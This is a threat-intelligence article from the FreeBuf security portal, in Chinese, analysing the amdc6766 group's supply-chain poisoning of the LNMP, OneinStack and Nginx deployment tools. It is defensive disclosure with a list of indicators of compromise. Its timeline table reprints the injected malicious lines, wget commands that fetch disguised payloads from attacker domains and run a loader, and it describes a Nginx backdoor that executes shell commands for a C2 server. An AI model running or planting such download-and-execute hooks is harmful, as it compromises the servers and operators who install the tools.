---
title: amdc6766团伙来袭，供应链投毒攻击再升级
url: https://www.freebuf.com/articles/network/401262.html
source: FreeBuf网络安全行业门户
date: 2024-05-18
fetch_date: 2025-10-06T16:51:21.223840
---

# amdc6766团伙来袭，供应链投毒攻击再升级

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

amdc6766组织来袭，供应链投毒攻击再升级

* ![]()
* 关注

* [基础安全](https://www.freebuf.com/articles/network)

amdc6766组织来袭，供应链投毒攻击再升级

2024-05-17 15:56:30

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

# 概要

2024年5月，深信服深瞻情报实验室，监测到LNMP遭受供应链投毒攻击。根据此次供应链攻击分析，深瞻情报实验室将该事件归因为amdc6766黑产组织。

2023上半年至今，amdc6766黑产组织利用仿冒页面（AMH、宝塔、Xshell、Navicat）、供应链投毒（LNMP、OneinStack）、公开web漏洞等攻击方式，针对运维人员开展定向攻击活动。运维人员从仿冒页面或官方平台下载并执行含有恶意代码的部署工具，与攻击者C2服务器建立DNS隧道连接。

该黑产组织定向投毒运维部署工具供应链，长期远控低价值主机作为肉鸡，择机选择高价值目标进行深度控制，下发Rootkit和代理工具，伺机从事各类黑产活动。

5月监测已有部分用户遭受供应链攻击，与攻击者C2服务器建立DNS隧道连接。

## **供应链****投毒事件时间线**

|  |  |  |  |
| --- | --- | --- | --- |
| 时间 | 软件名 | 被篡改的文件目录 | 植入恶意代码 |
| 2023年4月 | OneinStack | oneinstack/include/openssl.sh | wget http://download.cnoneinstack.com/oneinstack.jpg -cO /var/local/oneinstack.jpg \  tar zxf /var/local/oneinstack.jpg -C /var/local/  cd /var/local/cron \  ./load linux@QWE |
| 2023年4月 | LNMP | lnmp2.0/include/init.sh | wget http://lnmp01.amdc6766.net/lnmp.jpg -cO /var/local/lnmp.jpg \  tar zxf /var/local/lnmp.jpg -C /var/local/  cd /var/local/cron \  ./load linux@QWE |
| 2023年9月 | LNMP | lnmp2.0/include/init.sh、lnmp.sh | ../tools/lnmp.sh  linhkkngf@QWE |
| 2023年10月 | OneinStack | /src/pcre-8.45.tar.gz/pcre-8.45/configure | wget -q -nv http://download.oneinstack.club/osk.jpg -cO /var/local/osk.jpg  tar zxf /var/local/osk.jpg -C /var/local/ > /dev/null  rm -f /var/local/osk.jpg  /var/local/cron/load linhkkngf@QWE |
| 2024年4月 | LNMP/Nginx | Nginx-1.24/src/os/unix/ngx\_process.c | 新增ngx\_thread\_pool函数 |

## **供应链****投毒事件****分析**

此次攻击者使用新的供应链攻击路径，通过LNMP下载并编译被植入恶意代码的Nginx源码，达到植入Nginx后门的目的，较之前更为隐蔽。

LNMP官方网站下载链接的lnmp2.0.tar.gz大小为201KB，其md5值为a3a931ffa6cce98268151d4701cb9fba，与官网标注的大小196KB和md5值1a02938df2e449a35caec4e10aa3ae7a不一致。

![1715932261_66470c65005380e00782b.png!small?1715932261879](https://image.3001.net/images/20240517/1715932261_66470c65005380e00782b.png!small?1715932261879)

version.sh脚本中配置下载nginx-1.24.0.tar.gz。

![1715932263_66470c67ed46ba6eb345e.png!small?1715932264018](https://image.3001.net/images/20240517/1715932263_66470c67ed46ba6eb345e.png!small?1715932264018)

lnmp.conf配置下载地址为https://soft.lnmp.com。

![1715932267_66470c6bc4440616b7f8d.png!small?1715932268300](https://image.3001.net/images/20240517/1715932267_66470c6bc4440616b7f8d.png!small?1715932268300)

运行LNMP2.0安装脚本install.sh，下载nginx-1.24.0.tar.gz，MD5为bd20c0791c5616f0cda944a9aa587beb。

下载编译安装完成后，删除nginx-1.24.0.tar.gz。

![1715932272_66470c705bfdee05e430e.png!small?1715932275114](https://image.3001.net/images/20240517/1715932272_66470c705bfdee05e430e.png!small?1715932275114)

目前，官方已经下架nginx-1.24.0.tar.gz源码压缩包。

![1715932295_66470c87b92ef9e328786.png!small?1715932295737](https://image.3001.net/images/20240517/1715932295_66470c87b92ef9e328786.png!small?1715932295737)

分析编译后的恶意nginx-1.24.0，植入ngx\_thread\_pool函数。

![1715932445_66470d1d2fa6be704eec3.png!small](https://image.3001.net/images/20240517/1715932445_66470d1d2fa6be704eec3.png!small)

ngx\_thread\_pool函数作用提供一个远程执行命令的功能。

首先异或解密出C2域名为nginx.dev。

![1715932451_66470d2332d3830741e84.png!small?1715932451190](https://image.3001.net/images/20240517/1715932451_66470d2332d3830741e84.png!small?1715932451190)

向nginx.dev发送socket请求。

![1715932459_66470d2b9b3cd950f38c5.png!small?1715932459895](https://image.3001.net/images/20240517/1715932459_66470d2b9b3cd950f38c5.png!small?1715932459895)

根据C2返回的数据缓冲区的一个字节，来执行不同操作。

0x03：fork子进程/bin/sh，将后续数据作为命令执行，并将执行结果发送回C2服务器。

0x08：将休眠时间设置为 86400 秒（24h）。

0x09：将休眠时间设置为 10 秒。

![1715932465_66470d313b8069661de10.png!small?1715932466426](https://image.3001.net/images/20240517/1715932465_66470d313b8069661de10.png!small?1715932466426)

攻击者连接Nginx后门，下载cron.zip密码amdc6766!@#解压并执行install恶意程序。

![1715932470_66470d36efef1d6b269b0.png!small?1715932471478](https://image.3001.net/images/20240517/1715932470_66470d36efef1d6b269b0.png!small?1715932471478)

## **关联分析**

此次供应链攻击事件的分析发现，与上半年监测到的amdc6766团伙多起供应链投毒的具有较高相似性，后续下载的攻击套件与历史上amdc6766团伙攻击事件TTPs相同，如：

* 压缩包密码为amdc6766!@#
* 恶意文件伪装为jpg
* 加载器的参数相似linux@QWE或linhkkngf@QWE
* install执行参数相同linux@QWE
* 利用crond服务实现持久化
* 执行crond程序加载恶意动态链接库
* 建立DNS隧道连接
* 加载内核态Rootkit，实现UDP远控

amdc6766团伙的完整攻击流程，

amdc6766黑产组织长期利用仿冒页面、供应链投毒、公开web漏洞等攻击方式，针对运维人员常用软件Navicat、Xshell、LNMP、AMH、OneinStack、宝塔等开展定向攻击活动，选择出高价值目标后，植入动态链接库、Rootkit、恶意crond服务等持久化手段长期控制主机，伺机发起各类黑产攻击活动。

## **IOC**

xg.x2kk.com

mg.x2kk.com

gz.x2kk.com

x2kk.com

aliyun.topsec360.com

baidu.topsec360.com

nginx.dev
8.217.202.103
8.134.94.44

bd20c0791c5616f0cda944a9aa587beb

3f808c34aa3e63ef7d8e651c0dd4b9fa

8a52a20b1aa0c3876b64409f772e2436
6ef60b19d328e663fe33473b947be953
3f808c34aa3e63ef7d8e651c0dd4b9fa
a3a931ffa6cce98268151d4701cb9fba
a4509c21c8a6e324ae95436a46270bd6

b9128148ad7cb6a0f2a1c8e40786ff59

8fbbace71d1d7cb681066dd17535a959

adc94cd2079fa8cf7c28ed56be56cf5b

87257e0e7bc8dedf72122ce0a4ca7608

# apt攻击 # 黑客组织 # 供应链攻击

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

供应链投毒事件时间线

供应链投毒事件分析

关联分析

IOC

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)